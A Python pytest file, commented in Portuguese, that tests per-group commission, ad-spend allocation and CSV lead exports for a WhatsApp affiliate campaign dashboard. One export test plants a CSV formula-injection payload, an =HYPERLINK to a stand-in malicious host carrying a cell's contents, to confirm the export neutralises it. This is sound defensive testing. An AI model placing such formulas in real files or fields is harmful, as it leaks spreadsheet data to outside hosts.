"""
Resultados por grupo (F7): a corrente virando número.

O invariante mais importante: **comissão líquida usa a fórmula do KpiService**
(bruta × (1 − imposto)), nunca as colunas cost/profit, que estão mortas. Se
divergir do Dashboard, a afiliada perde a confiança nos dois números.
"""
import uuid
from datetime import date, datetime, timedelta, timezone

import pytest
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

PG_URL = "postgresql://dashads_user:dashads_password@localhost:5434/dashads_db"
try:
    _p = create_engine(PG_URL, pool_pre_ping=True)
    with _p.connect() as _c:
        _c.execute(text("SELECT 1"))
    PG_OK = True
except Exception:
    PG_OK = False

pytestmark = pytest.mark.skipif(not PG_OK, reason="Postgres local (5434) indisponível")

if PG_OK:
    from app.db.base import Base
    import app.models  # noqa: F401
    ENGINE = create_engine(PG_URL)
    Base.metadata.create_all(ENGINE)
    with ENGINE.begin() as _conn:
        _conn.execute(text("ALTER TABLE campaign_daily_insights ADD COLUMN IF NOT EXISTS leads INTEGER"))
    Sessao = sessionmaker(bind=ENGINE)

from app.models.campanha_anuncio import CampanhaAnuncio  # noqa: E402
from app.models.campanha_grupos import Campanha, CampanhaGrupo  # noqa: E402
from app.models.campaign import Campaign, CampaignDailyInsight  # noqa: E402
from app.models.dataset import Dataset  # noqa: E402
from app.models.dataset_row import DatasetRow  # noqa: E402
from app.models.user import User  # noqa: E402
from app.models.user_settings import UserSettings  # noqa: E402
from app.models.whatsapp_grupos import WhatsappGrupo  # noqa: E402
from app.repositories.campanha_anuncio_repository import CampanhaAnuncioRepository  # noqa: E402
from app.services.campanha_resultado_service import CampanhaResultadoService  # noqa: E402
from app.services.grupo_evento_service import GrupoEventoService  # noqa: E402

HOJE = date.today()
ONTEM = HOJE - timedelta(days=1)


@pytest.fixture
def db():
    s = Sessao()
    yield s
    s.rollback()
    s.close()


def _cenario(db, imposto_comissao=0.0, imposto_anuncio=0.0):
    suf = uuid.uuid4().hex[:8]
    user = User(email=f"r-{suf}@x.com", hashed_password="x")
    db.add(user); db.flush()
    if imposto_comissao or imposto_anuncio:
        db.add(UserSettings(user_id=user.id, ad_tax_rate=imposto_anuncio,
                            commission_tax_rate=imposto_comissao))
    campanha = Campanha(user_id=user.id, nome=f"c-{suf}")
    db.add(campanha); db.flush()
    grupos = []
    for i in range(2):
        g = WhatsappGrupo(user_id=user.id, jid=f"12036{suf}{i}@g.us", nome=f"G{i}",
                          ativo=True, permite_envio=True, sou_admin=True,
                          participantes=100 * (i + 1), capacidade=1024,
                          # Entropia inteira: `sub_id` é UNIQUE e este banco de
                          # teste acumula entre execuções — 4 hex colidem.
                          sub_id=f"wg{suf}{i}",
                          link_convite=f"https://chat.whatsapp.com/{suf}{i}")
        db.add(g); db.flush()
        db.add(CampanhaGrupo(campanha_id=campanha.id, grupo_id=g.id, posicao=i))
        grupos.append(g)
    # dataset_rows_v2 tem FK para datasets — o cenário precisa de um real.
    dataset = Dataset(user_id=user.id, filename=f"t-{suf}.csv", status="completed")
    db.add(dataset); db.flush()
    db.commit()
    return user, campanha, grupos, dataset.id


def _venda(db, user_id, sub_id, comissao, order_id, status="concluído", dia=None,
           dataset_id=1):
    db.add(DatasetRow(dataset_id=dataset_id, user_id=user_id, date=dia or HOJE, product="p",
                      status=status, revenue=comissao * 10, commission=comissao,
                      sub_id1=sub_id, order_id=order_id))


def test_comissao_liquida_usa_a_formula_do_kpi_service(db):
    user, campanha, grupos, ds = _cenario(db, imposto_comissao=6.0)   # 6%
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    _venda(db, user.id, grupos[0].sub_id, 50.0, "P2", dataset_id=ds)
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    linha = next(l for l in r["linhas"] if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(141.0)   # 150 × 0,94
    assert linha["pedidos"] == 2


def test_pedido_cancelado_nao_conta_mas_a_comissao_soma(db):
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 10.0, "OK", dataset_id=ds)
    _venda(db, user.id, grupos[0].sub_id, 5.0, "CANC", status="cancelado", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["pedidos"] == 1
    assert linha["comissao_liquida"] == pytest.approx(15.0)


def test_lucro_por_pessoa_e_a_metrica_de_destaque(db):
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 200.0, "P1", dataset_id=ds)   # grupo com 100 pessoas
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["lucro"] == pytest.approx(200.0)
    assert linha["lucro_por_pessoa"] == pytest.approx(2.0)   # 200 / 100


def test_gasto_do_anuncio_e_rateado_por_entradas(db):
    user, campanha, grupos, ds = _cenario(db, imposto_anuncio=10.0)   # markup 10%
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="Anúncio de grupo", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=100.0, clicks=10, impressions=100, leads=8))
    db.commit()

    # 3 entradas no grupo 0, 1 no grupo 1 → rateio 75/25
    svc = GrupoEventoService(db)
    svc.registrar(user.id, grupos[0].jid, "join",
                  [f"55119999{i:04d}@c.us" for i in range(3)])
    svc.registrar(user.id, grupos[1].jid, "join", ["5511988887777@c.us"])

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    por_id = {l["grupo_id"]: l for l in r["linhas"]}
    # gasto com imposto = 100 × 1,10 = 110
    assert por_id[grupos[0].id]["gasto_atribuido"] == pytest.approx(82.5)   # 75%
    assert por_id[grupos[1].id]["gasto_atribuido"] == pytest.approx(27.5)   # 25%


def test_metricas_do_anuncio_distinguem_sem_pixel_de_zero_lead(db):
    user, campanha, grupos, ds = _cenario(db)
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    # dia SEM leads reportados (sem pixel) → NULL, não 0
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=50.0, clicks=5, impressions=50, leads=None))
    db.commit()

    m = CampanhaAnuncioRepository(db).metricas(user.id, campanha.id, ONTEM, HOJE)
    assert m["gasto"] == pytest.approx(50.0)
    assert m["leads"] is None        # "configure o pixel", nunca "0 leads"


def test_vinculo_substitui_o_conjunto_e_alimenta_o_selo(db):
    user, campanha, grupos, ds = _cenario(db)
    anuncios = []
    for i in range(3):
        c = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                     name=f"A{i}", status="ACTIVE")
        db.add(c); db.flush()
        anuncios.append(c)
    repo = CampanhaAnuncioRepository(db)

    repo.definir(campanha.id, [anuncios[0].id, anuncios[1].id])
    db.commit()
    assert set(repo.campaign_ids(campanha.id)) == {anuncios[0].id, anuncios[1].id}

    repo.definir(campanha.id, [anuncios[2].id])
    db.commit()
    assert repo.campaign_ids(campanha.id) == [anuncios[2].id]

    selo = repo.campanha_por_campaign(user.id)
    assert selo[anuncios[2].id]["nome"] == campanha.nome
    assert anuncios[0].id not in selo


def test_campanha_sem_grupos_nao_quebra(db):
    suf = uuid.uuid4().hex[:8]
    user = User(email=f"v-{suf}@x.com", hashed_password="x")
    db.add(user); db.flush()
    campanha = Campanha(user_id=user.id, nome="vazia")
    db.add(campanha); db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert r["linhas"] == [] and r["totais"]["lucro"] == 0.0


def test_entradas_antigas_ficam_fora_do_periodo_e_do_rateio(db):
    """
    Entradas/saídas seguem o filtro de período como todo o resto da tela.

    Sem isso a tela soma entradas históricas ao lado de comissão de 7 dias — e,
    pior, rateia o gasto do período por entradas de meses atrás: o grupo que
    encheu em julho leva o gasto de agosto.
    """
    user, campanha, grupos, ds = _cenario(db, imposto_anuncio=0.0)
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=100.0, clicks=10, impressions=100, leads=None))
    db.commit()

    svc = GrupoEventoService(db)
    svc.registrar(user.id, grupos[0].jid, "join", ["5511900000001@c.us"])
    svc.registrar(user.id, grupos[1].jid, "join", ["5511900000002@c.us"])
    db.commit()

    # Envelhece a entrada do grupo 1 para 40 dias atrás.
    db.execute(text("""
        UPDATE grupo_eventos SET criado_em = now() - interval '40 days'
         WHERE grupo_id = :gid
    """), {"gid": grupos[1].id})
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    por_id = {l["grupo_id"]: l for l in r["linhas"]}
    assert por_id[grupos[1].id]["entradas"] == 0, "entrada de 40 dias atrás entrou no período"
    assert por_id[grupos[0].id]["entradas"] == 1
    # Só o grupo 0 teve entrada no período → leva o gasto inteiro.
    assert por_id[grupos[0].id]["gasto_atribuido"] == pytest.approx(100.0)
    assert por_id[grupos[1].id]["gasto_atribuido"] == pytest.approx(0.0)


def test_resumo_consolidado_soma_campanhas_e_preserva_leads_nulo(db):
    """
    O bloco do Dashboard soma as campanhas ativas. `leads` continua None quando
    NENHUMA campanha reporta lead — somar como 0 diria "ninguém virou lead",
    que é uma afirmação diferente de "não sabemos".
    """
    from app.api.v1.routes.campanhas_grupos import resumo_consolidado

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 80.0, "P1", dataset_id=ds)

    outra = Campanha(user_id=user.id, nome="Segunda")
    db.add(outra); db.flush()
    g = WhatsappGrupo(user_id=user.id, jid=f"12036{uuid.uuid4().hex[:8]}@g.us",
                      nome="G-outra", ativo=True, permite_envio=True, sou_admin=True,
                      participantes=50, capacidade=1024,
                      sub_id=f"wg{uuid.uuid4().hex[:6]}",
                      link_convite="https://chat.whatsapp.com/z")
    db.add(g); db.flush()
    db.add(CampanhaGrupo(campanha_id=outra.id, grupo_id=g.id, posicao=0))
    _venda(db, user.id, g.sub_id, 20.0, "P2", dataset_id=ds)
    db.commit()

    r = resumo_consolidado(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                           current_user=user, db=db)
    assert r["campanhas_ativas"] == 2
    assert r["totais"]["comissao_liquida"] == pytest.approx(100.0)
    assert r["totais"]["participantes"] == 350          # 100 + 200 + 50
    assert r["leads"] is None                            # nenhum anúncio vinculado
    assert r["custo_por_entrada"] is None                # sem entradas
    assert [c["nome"] for c in r["por_campanha"]][0] == campanha.nome   # maior lucro 1º


def test_status_fora_do_kpi_nao_entra_na_comissao_do_grupo(db):
    """
    O recorte de status é o MESMO do KpiService — senão esta tela e o Dashboard
    mostram comissão diferente para a mesma venda, e é esta que decide quanto
    gastar em anúncio.

    UNPAID fica de fora (comissão não confirmada não é comissão); "cancelled"
    com dois L é a grafia que a Shopee realmente manda — some na comissão, mas
    não conta como pedido.
    """
    user, campanha, grupos, ds = _cenario(db)
    sub = grupos[0].sub_id
    _venda(db, user.id, sub, 100.0, "OK", dataset_id=ds)
    _venda(db, user.id, sub, 500.0, "SEM_PAGAMENTO", status="UNPAID", dataset_id=ds)
    _venda(db, user.id, sub, 70.0, "CANC", status="cancelled", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(170.0)   # 100 + 70, sem o UNPAID
    assert linha["pedidos"] == 1                                # cancelled não conta


def test_sub_id_com_traco_no_fim_ainda_casa_com_o_grupo(db):
    """`normalizar_sub_id` faz rtrim('-'); o filtro em SQL precisa fazer o
    mesmo, ou a venda desaparece da tela sem erro nenhum."""
    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, f"{grupos[0].sub_id.upper()}--", 40.0, "P1", dataset_id=ds)
    db.commit()

    linha = next(l for l in CampanhaResultadoService(db)
                 .por_grupo(user.id, campanha, ONTEM, HOJE)["linhas"]
                 if l["grupo_id"] == grupos[0].id)
    assert linha["comissao_liquida"] == pytest.approx(40.0)


def test_payloads_batem_com_os_schemas_de_resposta(db):
    """
    O `response_model` só valida na fronteira HTTP; os testes chamam a função
    direto e passariam por cima de um campo faltando. Validar aqui garante que
    a mudança de shape quebra o teste, não a tela.
    """
    from app.api.v1.routes.campanhas_grupos import resultados, resumo_consolidado
    from app.schemas.campanhas_grupos import ResultadosOut, ResumoConsolidadoOut

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 30.0, "P1", dataset_id=ds)
    db.commit()

    ResultadosOut.model_validate(resultados(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
        campanha=campanha, current_user=user, db=db))
    ResumoConsolidadoOut.model_validate(resumo_consolidado(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(), current_user=user, db=db))

    # As duas de vínculo também: um 500 de response_model só apareceu quando a
    # rota foi chamada por HTTP de verdade (chave int contra Dict[str, ...]).
    from app.api.v1.routes.campanhas_grupos import listar_anuncios, vinculos_de_anuncio
    from app.schemas.campanhas_grupos import AnunciosDaCampanhaOut, VinculosDeAnuncioOut

    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.commit()
    VinculosDeAnuncioOut.model_validate(vinculos_de_anuncio(current_user=user, db=db))
    AnunciosDaCampanhaOut.model_validate(
        listar_anuncios(campanha=campanha, current_user=user, db=db))


def test_periodo_invalido_da_422_em_vez_de_numero_errado(db):
    """Data quebrada tem que falhar alto. Cair no default de 30 dias faz um bug
    de data no frontend virar número silenciosamente errado numa tela que
    decide quanto gastar em anúncio."""
    from fastapi import HTTPException

    from app.api.v1.routes.campanhas_grupos import resultados

    user, campanha, grupos, ds = _cenario(db)
    with pytest.raises(HTTPException) as e:
        resultados(inicio="ontem", fim=HOJE.isoformat(),
                   campanha=campanha, current_user=user, db=db)
    assert e.value.status_code == 422


def test_anuncio_ja_vinculado_a_outra_campanha_da_409(db):
    """Um anúncio do Meta pertence a UMA campanha de grupos: vinculado a duas,
    o mesmo gasto entraria inteiro nas duas e os dois lucros sairiam errados."""
    from fastapi import HTTPException

    from app.api.v1.routes.campanhas_grupos import definir_anuncios, listar_anuncios

    user, campanha, grupos, ds = _cenario(db)
    outra = Campanha(user_id=user.id, nome="Outra")
    db.add(outra); db.flush()
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="Anúncio disputado", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=anuncio.id))
    db.commit()

    with pytest.raises(HTTPException) as e:
        definir_anuncios(payload=[anuncio.id], campanha=outra, current_user=user, db=db)
    assert e.value.status_code == 409
    # A mensagem nomeia o anúncio E a campanha que o detém: sem a segunda, a
    # afiliada não sabe para onde ir desvincular.
    assert "Anúncio disputado" in e.value.detail
    assert campanha.nome in e.value.detail

    # E a lista já avisa antes do clique, com o nome de quem o tem.
    linha = next(a for a in listar_anuncios(campanha=outra, current_user=user,
                                            db=db)["anuncios"] if a["id"] == anuncio.id)
    assert linha["vinculada"] is False
    # id junto do nome: sem o id a tela só linka para a lista e a afiliada tem
    # que caçar qual campanha desvincular.
    assert linha["vinculada_em_outra"] == {"id": campanha.id, "nome": campanha.nome}


def _csv_da_exportacao(resposta) -> list[str]:
    """StreamingResponse expõe um async generator — consome de propósito pelo
    mesmo caminho que o Starlette usaria."""
    import asyncio

    async def _juntar():
        partes = []
        async for p in resposta.body_iterator:
            partes.append(p.encode() if isinstance(p, str) else p)
        return b"".join(partes).decode()

    return asyncio.run(_juntar()).strip().splitlines()


def test_export_neutraliza_formula_no_nome_do_grupo(db):
    """
    O nome do grupo é escrito por QUALQUER admin do grupo — inclusive alguém
    que não é a afiliada. Sem neutralizar, `=HYPERLINK(...)` vira fórmula ativa
    quando ela abre o CSV no Excel/Sheets.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    grupos[0].nome = '=HYPERLINK("http://malicioso/?d="&A1;"Clique")'
    db.add(grupos[0])
    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
                                     ["5511900000009@c.us"])
    db.commit()

    linhas = _csv_da_exportacao(exportar_leads(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
        campanha=campanha, current_user=user, db=db))
    alvo = next(l for l in linhas[1:] if "HYPERLINK" in l)
    assert "'=HYPERLINK" in alvo, "fórmula saiu ativa no CSV"


def test_export_nao_quebra_com_emoji_no_nome_da_campanha(db):
    """Header HTTP é latin-1 no Starlette: emoji no nome da campanha (rotineiro)
    derrubava a request com UnicodeEncodeError — 500 sem saída para a usuária."""
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    campanha.nome = "Promoção VIP 🔥 verão"
    db.add(campanha)
    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
                                     ["5511900000010@c.us"])
    db.commit()

    r = exportar_leads(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                       campanha=campanha, current_user=user, db=db)
    r.headers["content-disposition"].encode("latin-1")   # é o que o Starlette faz


def test_export_nao_traz_telefone_nem_hash(db):
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    GrupoEventoService(db).registrar(user.id, grupos[0].jid, "join",
                                     ["5511977776666@c.us"])
    db.commit()

    corpo = "\n".join(_csv_da_exportacao(exportar_leads(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
        campanha=campanha, current_user=user, db=db)))
    assert "5511977776666" not in corpo and "@c.us" not in corpo
    assert corpo.splitlines()[0] == "data_entrada,grupo,origem,ainda_no_grupo"


def test_quem_saiu_e_voltou_tem_uma_linha_nao_e_outra_sim(db):
    """
    "Ainda no grupo" é por ENTRADA, não por pessoa. Resolver pelo estado final
    marcava as DUAS entradas como "sim" e inflava a permanência justamente da
    coorte que a exportação existe para medir.
    """
    from app.api.v1.routes.campanhas_grupos import exportar_leads

    user, campanha, grupos, ds = _cenario(db)
    svc = GrupoEventoService(db)
    numero = "5511911112222@c.us"
    svc.registrar(user.id, grupos[0].jid, "join", [numero])
    svc.registrar(user.id, grupos[0].jid, "leave", [numero])
    svc.registrar(user.id, grupos[0].jid, "join", [numero])
    db.commit()
    # Ordena os 3 eventos no tempo (o registro é instantâneo demais).
    db.execute(text("""
        UPDATE grupo_eventos SET criado_em = now() - (interval '1 minute' * sub.n)
          FROM (SELECT id, row_number() OVER (ORDER BY id DESC) AS n
                  FROM grupo_eventos WHERE grupo_id = :gid) sub
         WHERE grupo_eventos.id = sub.id
    """), {"gid": grupos[0].id})
    db.commit()

    linhas = _csv_da_exportacao(exportar_leads(
        inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
        campanha=campanha, current_user=user, db=db))
    marcas = [l.split(",")[-1] for l in linhas[1:]]
    assert marcas == ["nao", "sim"], f"esperava uma saída registrada, veio {marcas}"


def test_export_de_anuncios_respeita_o_filtro_de_vinculo(db):
    """
    O arquivo tem que bater com a tela. Exportar com "Vinculadas a grupo" ativo
    e receber TODAS as campanhas é pior do que não ter export: a afiliada leva
    para a planilha um recorte diferente do que estava vendo.
    """
    user, campanha, grupos, ds = _cenario(db)
    vinculada = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                         name="Com vínculo", status="ACTIVE")
    solta = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                     name="Sem vínculo", status="ACTIVE")
    db.add_all([vinculada, solta]); db.flush()
    db.add(CampanhaAnuncio(campanha_id=campanha.id, campaign_id=vinculada.id))
    db.commit()

    repo = CampanhaAnuncioRepository(db)
    todas = [vinculada, solta]
    assert [c.id for c in repo.filtrar_por_vinculo(user.id, todas, "all")] == \
           [vinculada.id, solta.id]
    assert [c.id for c in repo.filtrar_por_vinculo(user.id, todas, "com_grupo")] == \
           [vinculada.id]
    assert [c.id for c in repo.filtrar_por_vinculo(user.id, todas, "sem_grupo")] == \
           [solta.id]
    # Valor desconhecido não filtra nada — nunca esconde dado por engano.
    assert len(repo.filtrar_por_vinculo(user.id, todas, "lixo")) == 2


def test_grupo_em_duas_campanhas_nao_dobra_o_bloco_do_dashboard(db):
    """
    Grupo em N campanhas é decisão de desenho da F2. Somar campanha a campanha
    contava o mesmo grupo uma vez por campanha: 1 grupo com 100 pessoas e R$100
    de comissão virava 200 pessoas e R$200 no bloco do Dashboard.
    """
    from app.api.v1.routes.campanhas_grupos import resumo_consolidado

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    outra = Campanha(user_id=user.id, nome="Segunda com o MESMO grupo")
    db.add(outra); db.flush()
    db.add(CampanhaGrupo(campanha_id=outra.id, grupo_id=grupos[0].id, posicao=0))
    db.add(CampanhaGrupo(campanha_id=outra.id, grupo_id=grupos[1].id, posicao=1))
    db.commit()

    r = resumo_consolidado(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                           current_user=user, db=db)
    assert r["campanhas_ativas"] == 2
    # Os dois grupos existem uma vez cada, não uma por campanha.
    assert r["totais"]["participantes"] == 300          # 100 + 200
    assert r["totais"]["comissao_liquida"] == pytest.approx(100.0)
    assert r["totais"]["pedidos"] == 1


def test_gasto_de_campanha_sem_grupos_entra_no_lucro_do_consolidado(db):
    """
    O investimento sempre somou todas as campanhas, mas o lucro vinha do rateio
    por grupo — e campanha sem grupo não tem rateio. O dinheiro aparecia no
    "Investimento" e sumia do "Lucro".
    """
    from app.api.v1.routes.campanhas_grupos import resumo_consolidado

    user, campanha, grupos, ds = _cenario(db)
    _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)

    vazia = Campanha(user_id=user.id, nome="Sem grupos ainda")
    db.add(vazia); db.flush()
    anuncio = Campaign(user_id=user.id, fb_campaign_id=f"fb{uuid.uuid4().hex[:6]}",
                       name="A", status="ACTIVE")
    db.add(anuncio); db.flush()
    db.add(CampanhaAnuncio(campanha_id=vazia.id, campaign_id=anuncio.id))
    db.add(CampaignDailyInsight(user_id=user.id, campaign_id=anuncio.id, date=HOJE,
                                spend=40.0, clicks=4, impressions=40, leads=None))
    db.commit()

    r = resumo_consolidado(inicio=ONTEM.isoformat(), fim=HOJE.isoformat(),
                           current_user=user, db=db)
    assert r["investimento"] == pytest.approx(40.0)
    assert r["totais"]["lucro"] == pytest.approx(60.0)   # 100 de comissão − 40
    assert r["totais"]["gasto_atribuido"] == pytest.approx(40.0)


def test_lucro_por_pessoa_sem_participante_e_none_nao_zero(db):
    """
    Sem participante a métrica NÃO existe. 0,00 diria "cada pessoa rende zero",
    que é outra afirmação — o mesmo colapso null-vs-zero que o módulo evita em
    `leads` e `cpl`.
    """
    user, campanha, grupos, ds = _cenario(db)
    for g in grupos:
        g.participantes = 0
        db.add(g)
    db.commit()

    r = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    assert all(l["lucro_por_pessoa"] is None for l in r["linhas"])
    assert r["totais"]["lucro_por_pessoa"] is None
    # E com participante, volta a existir.
    grupos[0].participantes = 50
    db.add(grupos[0]); _venda(db, user.id, grupos[0].sub_id, 100.0, "P1", dataset_id=ds)
    db.commit()
    r2 = CampanhaResultadoService(db).por_grupo(user.id, campanha, ONTEM, HOJE)
    linha = next(l for l in r2["linhas"] if l["grupo_id"] == grupos[0].id)
    assert linha["lucro_por_pessoa"] == pytest.approx(2.0)
